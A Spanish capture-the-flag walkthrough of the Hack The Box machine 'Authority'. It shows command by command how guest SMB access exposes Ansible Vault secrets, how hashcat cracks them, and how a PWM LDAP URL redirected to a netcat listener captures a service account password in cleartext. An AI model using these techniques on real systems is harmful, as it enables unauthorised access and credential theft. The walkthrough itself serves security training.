---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Authority

`Authority` es una máquina Windows de dificultad media que resalta los peligros de las configuraciones incorrectas, la reutilización de contraseñas, el almacenamiento de credenciales en recursos compartidos y demuestra cómo las configuraciones predeterminadas en Active Directory (como la capacidad de todos los usuarios del dominio de agregar hasta 10 computadoras al dominio) se pueden combinar con otros problemas (plantillas de certificado AD CS vulnerables) para apoderarse de un dominio.

<figure><img src="../../.gitbook/assets/Authority.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con `nmap` para ver los puertos que están expuestos en la máquina **`Authority`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.222 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-22 04:07 CET
Initiating SYN Stealth Scan at 04:07
Scanning 10.10.11.222 [65535 ports]
Discovered open port 135/tcp on 10.10.11.222
Discovered open port 445/tcp on 10.10.11.222
Discovered open port 139/tcp on 10.10.11.222
Discovered open port 80/tcp on 10.10.11.222
Discovered open port 53/tcp on 10.10.11.222
Discovered open port 9389/tcp on 10.10.11.222
Discovered open port 47001/tcp on 10.10.11.222
Discovered open port 49667/tcp on 10.10.11.222
Discovered open port 464/tcp on 10.10.11.222
Discovered open port 53249/tcp on 10.10.11.222
Discovered open port 3268/tcp on 10.10.11.222
Discovered open port 49664/tcp on 10.10.11.222
Discovered open port 5985/tcp on 10.10.11.222
Discovered open port 88/tcp on 10.10.11.222
Discovered open port 49692/tcp on 10.10.11.222
Discovered open port 49673/tcp on 10.10.11.222
Discovered open port 593/tcp on 10.10.11.222
Discovered open port 49704/tcp on 10.10.11.222
Discovered open port 49665/tcp on 10.10.11.222
Discovered open port 49695/tcp on 10.10.11.222
Discovered open port 3269/tcp on 10.10.11.222
Discovered open port 49709/tcp on 10.10.11.222
Discovered open port 49696/tcp on 10.10.11.222
Discovered open port 49693/tcp on 10.10.11.222
Discovered open port 53230/tcp on 10.10.11.222
Discovered open port 636/tcp on 10.10.11.222
Discovered open port 8443/tcp on 10.10.11.222
Discovered open port 389/tcp on 10.10.11.222
Discovered open port 49666/tcp on 10.10.11.222
Completed SYN Stealth Scan at 04:07, 28.08s elapsed (65535 total ports)
Nmap scan report for 10.10.11.222
Host is up, received user-set (0.13s latency).
Scanned at 2025-02-22 04:07:03 CET for 28s
Not shown: 62136 closed tcp ports (reset), 3370 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
8443/tcp  open  https-alt        syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49692/tcp open  unknown          syn-ack ttl 127
49693/tcp open  unknown          syn-ack ttl 127
49695/tcp open  unknown          syn-ack ttl 127
49696/tcp open  unknown          syn-ack ttl 127
49704/tcp open  unknown          syn-ack ttl 127
49709/tcp open  unknown          syn-ack ttl 127
53230/tcp open  unknown          syn-ack ttl 127
53249/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.18 seconds
           Raw packets sent: 79038 (3.478MB) | Rcvd: 62564 (2.503MB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.222
	[*] Open ports: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49673,49692,49693,49695,49696,49704,49709,53230,53249

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. Verificamos a través del resultado obtenido de que la máquina se trata de un Domain Controller (DC) por los puertos y servicios que se encuentran expuestos.

```bash
❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49673,49692,49693,49695,49696,49704,49709,53230,53249 10.10.11.222 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-22 04:07 CET
Nmap scan report for authority.htb (10.10.11.222)
Host is up (0.22s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-22 05:39:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-02-22T05:40:59+00:00; +2h31m41s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-02-22T05:41:00+00:00; +2h31m41s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-02-22T05:40:59+00:00; +2h31m41s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-02-22T05:41:00+00:00; +2h31m41s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2025-02-20T05:32:37
|_Not valid after:  2027-02-22T17:11:01
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49693/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
53230/tcp open  msrpc         Microsoft Windows RPC
53249/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows 2019|10|2012|2022|2016|2008|7|Vista (95%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_vista::sp1:home_premium
Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Windows Server 2019 (92%), Microsoft Windows 10 1909 (92%), Microsoft Windows 10 1909 - 2004 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2022 (91%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 20H2 (89%), Microsoft Windows 10 20H2 - 21H1 (89%), Microsoft Windows 10 21H2 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-02-22T05:40:53
|_  start_date: N/A
|_clock-skew: mean: 2h31m40s, deviation: 0s, median: 2h31m40s

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   207.94 ms 10.10.16.1
2   85.60 ms  authority.htb (10.10.11.222)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.49 seconds
```

Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/imagen (441).png" alt=""><figcaption></figcaption></figure>

A través de la herramienta de `nxc` y `ldapsearch` enumeraremos el equipo para localizar más información. Entre la información obtenida, verificamos el `hostname`, versión del SO y el nombre del dominio.

```bash
❯ nxc smb 10.10.11.222
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)

❯ ldapsearch -x -H ldap://10.10.11.222 -s base | grep defaultNamingContext
defaultNamingContext: DC=authority,DC=htb
```

Añadiremos en nuestro archivo `/etc/hosts` las entradas correspondientes para que a la hora de hacer referencia al dominio o el equipo, nos responda correctamente a la dirección IP del Domain Controller.

```bash
❯ cat /etc/hosts | grep authority
10.10.11.222 authority.htb AUTHORITY.authority.htb
```

## Web Enumeration

Comprobaremos las páginas web que se encuentran expuestas en el Domain Controller. Para empezar, al acceder a [http://10.10.11.222](http://10.10.11.222) nos encontramos con la página principal de `IIS` (Internet Internet Information Services).

<figure><img src="../../.gitbook/assets/imagen (442).png" alt=""><figcaption></figcaption></figure>

Al acceder a [https://10.10.11.222:8443](https://10.10.11.222:8443) se nos muestra la siguiente página web en la cual se trata de `PWM`, la cual nos ofrece un panel de inicio de sesión para proporcionar credenciales y dos opciones para abrir la configuración.

{% hint style="info" %}
[PWM](https://github.com/pwm-project/pwm) es una aplicación de autoservicio de contraseñas de código abierto para directorios LDAP.
{% endhint %}

<figure><img src="../../.gitbook/assets/imagen (443).png" alt=""><figcaption></figcaption></figure>

Al acceder a cualquier de las opciones presentes, se nos requiere también proporcionar credenciales válidas para acceder al `PWM`. Deberemos de intentar buscar alguna vía para ver si logramos obtener credenciales de acceso o averiguar si hay otro vector de ataque.

<figure><img src="../../.gitbook/assets/imagen (445).png" alt=""><figcaption></figcaption></figure>

Realizaremos una enumeración de directorios y páginas web en la página web del `IIS`y no obtenemos resultado interesante. También probamos en la página del `PWM`pero tampoco logramos encontrar nada interesante.

```bash
❯ feroxbuster -u http://10.10.11.222/ -t 200 -C 500,502,404
                                                                                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.222/
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [500, 502, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      334l     2089w   180418c http://10.10.11.222/iisstart.png
200      GET       32l       55w      703c http://10.10.11.222/
400      GET        6l       26w      324c http://10.10.11.222/error%1F_log
[####################] - 20s    30005/30005   0s      found:3       errors:0      
[####################] - 19s    30002/30002   1555/s  http://10.10.11.222/  
```

## SMB Enumeration

Revisaremos el servicio `SMB` y comprobamos que el usuario `guest` se encuentra habilitado, por lo tanto tenemos la posibilidad de recopilar información con este usuario, como verificar si dispone de acceso algún recurso compartido, realizar un ataque de `RID Cycling Attack`, etc.

Comprobamos que a través del usuario `guest` dispone de acceso a un recurso compartido llamado `Development`, dado que dispone de permisos de `READ`.

```bash
❯ nxc smb 10.10.11.222 -u 'guest' -p ''
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\guest: 
❯ nxc smb 10.10.11.222 -u 'guest' -p '' --shares
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\guest: 
SMB         10.10.11.222    445    AUTHORITY        [*] Enumerated shares
SMB         10.10.11.222    445    AUTHORITY        Share           Permissions     Remark
SMB         10.10.11.222    445    AUTHORITY        -----           -----------     ------
SMB         10.10.11.222    445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.10.11.222    445    AUTHORITY        C$                              Default share
SMB         10.10.11.222    445    AUTHORITY        Department Shares                 
SMB         10.10.11.222    445    AUTHORITY        Development     READ            
SMB         10.10.11.222    445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.10.11.222    445    AUTHORITY        NETLOGON                        Logon server share 
SMB         10.10.11.222    445    AUTHORITY        SYSVOL                          Logon server share 
```

Montaremos este recurso compartido en nuestro directorio `/mnt/shares` que tenemos creado en nuestro equipo local previamente.

Verificaremos que la montura a través de `cifs` se ha realizado correctamente y disponemos del contenido del recurso compartido. Verificando que disponemos del recurso en local, copiaremos el directorio de manera recursvia al directorio de trabajo en el cual nos encontramos trabajando, para no tener problemas de lentitud, etc.

```bash
❯ sudo mount -t cifs -o username='guest',password='' '//10.10.11.222/Development' /mnt/shares
[sudo] contraseña para kali: 
❯ ls -l /mnt/shares
drwxr-xr-x root root 0 B Fri Mar 17 14:20:40 2023  Automation
❯ cp -r /mnt/shares/Automation .
```

Accederemos al directorio `Automation` y comprobaremos la estructura del recurso compartido.&#x20;

Como podemos observar, la estructura del directorio `Automation` está organizada en varias subcarpetas, entre ellas `Ansible, LDAP, PWM, y SHARE`. Cada una de estas carpetas contiene varios archivos y subdirectorios que parecen ser parte de configuraciones relacionadas con la automatización y administración de sistemas.

```bash
❯ cd Automation
❯ tree -a
.
└── Ansible
    ├── ADCS
    │   ├── .ansible-lint
    │   ├── defaults
    │   │   └── main.yml
    │   ├── LICENSE
    │   ├── meta
    │   │   ├── main.yml
    │   │   └── preferences.yml
    │   ├── molecule
    │   │   └── default
    │   │       ├── converge.yml
    │   │       ├── molecule.yml
    │   │       └── prepare.yml
    │   ├── README.md
    │   ├── requirements.txt
    │   ├── requirements.yml
    │   ├── SECURITY.md
    │   ├── tasks
    │   │   ├── assert.yml
    │   │   ├── generate_ca_certs.yml
    │   │   ├── init_ca.yml
    │   │   ├── main.yml
    │   │   └── requests.yml
    │   ├── templates
    │   │   ├── extensions.cnf.j2
    │   │   └── openssl.cnf.j2
    │   ├── tox.ini
    │   ├── vars
    │   │   └── main.yml
    │   └── .yamllint
    ├── LDAP
    │   ├── .bin
    │   │   ├── clean_vault
    │   │   ├── diff_vault
    │   │   └── smudge_vault
    │   ├── defaults
    │   │   └── main.yml
    │   ├── files
    │   │   └── pam_mkhomedir
    │   ├── handlers
    │   │   └── main.yml
    │   ├── meta
    │   │   └── main.yml
    │   ├── README.md
    │   ├── tasks
    │   │   └── main.yml
    │   ├── templates
    │   │   ├── ldap_sudo_groups.j2
    │   │   ├── ldap_sudo_users.j2
    │   │   ├── sssd.conf.j2
    │   │   └── sudo_group.j2
    │   ├── TODO.md
    │   ├── .travis.yml
    │   ├── Vagrantfile
    │   └── vars
    │       ├── debian.yml
    │       ├── main.yml
    │       ├── redhat.yml
    │       └── ubuntu-14.04.yml
    ├── PWM
    │   ├── ansible.cfg
    │   ├── ansible_inventory
    │   ├── defaults
    │   │   └── main.yml
    │   ├── handlers
    │   │   └── main.yml
    │   ├── meta
    │   │   └── main.yml
    │   ├── README.md
    │   ├── tasks
    │   │   └── main.yml
    │   └── templates
    │       ├── context.xml.j2
    │       └── tomcat-users.xml.j2
    └── SHARE
        └── tasks
            └── main.yml

27 directories, 52 files
```

## Initial Foothold

### Cracking Ansible Vault Secrets with Hashcat

Revisamos los archivos disponibles en el directorio y encontramos uno en particular dentro de `Automation/Ansible/PWM/defaults`, que contiene varias cadenas cifradas con **Ansible Vault**. Estas cadenas están relacionadas con contraseñas y configuraciones críticas, como el usuario y contraseña del administrador de PWM y el administrador de LDAP.

```yaml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

Para lograr el formato adecuado de los hashes y poder crackearlos con Hashcat, hemos seguido los siguientes pasos:

1. **Extracción del contenido**: Hemos obtenido los tres hashes desde los archivos `pwm_admin_login`, `pwm_admin_password`, y `ldap_admin_password`, los cuales estaban mal formateados debido a espacios y saltos de línea innecesarios.
2. **Formateo adecuado**: Hemos utilizado `awk` y `tr` para eliminar los espacios y saltos de línea, dejando los hashes en el formato correcto. Cada uno de los archivos ahora contiene solo el hash en formato continuo, como se muestra a continuación:

{% embed url="https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/" %}

```bash
❯ cat pwm_admin_login pwm_admin_password ldap_admin_password
$ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438
$ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531
$ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
❯ awk 'NR==1{print; next} {printf "%s", $0} END{print ""}' pwm_admin_login | tr -d ' ' > temp && mv temp pwm_admin_login
❯ awk 'NR==1{print; next} {printf "%s", $0} END{print ""}' pwm_admin_password | tr -d ' ' > temp && mv temp pwm_admin_password
❯ awk 'NR==1{print; next} {printf "%s", $0} END{print ""}' ldap_admin_password | tr -d ' ' > temp && mv temp ldap_admin_password
❯ cat pwm_admin_login pwm_admin_password ldap_admin_password
$ANSIBLE_VAULT;1.1;AES256
326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438
$ANSIBLE_VAULT;1.1;AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531
$ANSIBLE_VAULT;1.1;AES256
633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
```

Para continuar con el proceso de cracking de los hashes obtenidos desde los archivos de Ansible Vault, hemos seguido los siguientes pasos:

1. **Extracción de hashes con** `ansible2john`: Utilizamos el comando `ansible2john` para convertir los archivos de Ansible Vault en un formato compatible con herramientas como **John the Ripper** o **Hashcat**. Esto nos permite obtener los hashes en su forma estructurada para ser crackeados.
2. **Contenido de los hashes**: El resultado de la ejecución del comando muestra los hashes extraídos de los tres archivos. A continuación, el contenido de los hashes:

```bash
❯ ansible2john pwm_admin_login pwm_admin_password ldap_admin_password | tee hashes > hashes
❯ cat hashes
pwm_admin_login:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
pwm_admin_password:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
ldap_admin_password:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
```

Al crackear los hashes de Ansible Vault con `Hashcat`, utilizando el siguiente comando:

Nos encontramos con que los tres hashes, correspondientes a `pwm_admin_login, pwm_admin_password y ldap_admin_password`, fueron descifrados con la misma contraseña:

```bash
❯ hashcat -a 0 -m 16900 hashes /usr/share/wordlists/rockyou.txt --user
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2913/5891 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 3 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1


$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&*
```

A través de la herramienta de `ansible-vault` trataremos de desencriptar las credenciales de `Ansible`. FInalmente, logramos obtener las credenciales del usuario `PWM` y credenciales de un usuario de `LDAP`.

```bash
❯ cat pwm_admin_login | ansible-vault decrypt; echo
Vault password: 
Decryption successful
svc_pwm
❯ cat pwm_admin_password | ansible-vault decrypt; echo
Vault password: 
Decryption successful
pWm_@dm!N_!23
❯ cat ldap_admin_password | ansible-vault decrypt; echo
Vault password: 
Decryption successful
DevT3st@123
```

## Initial Access

### Accesing on PWM (Password Recovery Tool from LDAP)

Verificaremos si con estas credenciales podemos acceder a la página web de `PWM` ([https://10.10.11.222:8443](https://10.10.11.222:8443)). En este caso, se nos muestra un mensaje de error indicando el siguiente mensaje: `Directory unaivailable`.

<figure><img src="../../.gitbook/assets/imagen (446).png" alt="" width="563"><figcaption></figcaption></figure>

Accederemos a la opción de `Configuration Editor` ([https://10.10.11.222:8443/pwm/private/config/login](https://10.10.11.222:8443/pwm/private/config/login)) e ingresaremos las credenciales del usuario `PWM`que hemos obtenido de `Ansible`.

<figure><img src="../../.gitbook/assets/5212_vmware_aEObt8usUd.png" alt="" width="563"><figcaption></figcaption></figure>

### Abusing PWM to modify the LDAP URL to our IP to obtain the saved password

Comprobamos que finalmente hemos logrado acceder al `PWM` con las credenciales proporcionadas. Estando dentro de la herramienta, comprobamos que en el apartado de `LDAP Connection` aparece la configuración de la conexión al servidor LDAP ([ldaps://authority.htb:636/](ldaps://authority.htb:636/)).

En esta configuración, se aprecia que hay un `Value stored` en el apartado de `LDAP Proxy Password`, lo que siguiere que las credenciales del usuario `svc_ldap` que es el que aparece en el apartado de `LDAP Proxy User` se encuentran almacenadas en la configuración de `PWM`.

<figure><img src="../../.gitbook/assets/imagen (447).png" alt=""><figcaption></figcaption></figure>

Probamos de modificar el `LDAP URLs` y comprobamos que al parecer nos permite editar la URL del servidor LDAP contra el cual se autentica este usuario con las credenciales guardadas. Por lo tanto, si tenemos permisos para editar la URL del servidor LDAP para que apunte a nuestra dirección IP, quizás podamos obtener las credenciales de la autenticación de las credenciales almacenadas.&#x20;

<figure><img src="../../.gitbook/assets/5215_vmware_hOPxHyJuSV.png" alt=""><figcaption></figcaption></figure>

Por lo tanto, nos pondremos en escucha por el puerto `389` que es el puerto predeterminado de `LDAP`.

```bash
❯ nc -nlvp 389
listening on [any] 389 ...
```

Editaremos la `LDAP URLs` para indicar nuestro servidor LDAP ficticio de nuestro servidor.

<figure><img src="../../.gitbook/assets/imagen (448).png" alt=""><figcaption></figcaption></figure>

Comprobamos que se ha logrado modificar el servidor LDAP configurado en `PWM`. Le daremos a la opción de `Test LDAP Profile`para comprobar si a nuestro servidor LDAP ficticio nos llega algún tipo de información, como la autenticación de las credenciales almacenadas.

<figure><img src="../../.gitbook/assets/imagen (449).png" alt=""><figcaption></figcaption></figure>

Comprobamos que se ha recibido las credenciales almacenadas del usuario `svc_ldap` correctamente, esto debido a que hemos logrado modificar el servidor LDAP por el nuestro propio y el usuario almacenadado en la configuración del `PWM` se ha autenticado en nuestro servidor y no en el del DC.

```bash
❯ nc -nlvp 389
listening on [any] 389 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.222] 64084
0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r!
```

Obtenemos el mismo resultado capturando el protocolo `LDAP` a través de `Wireshark`.

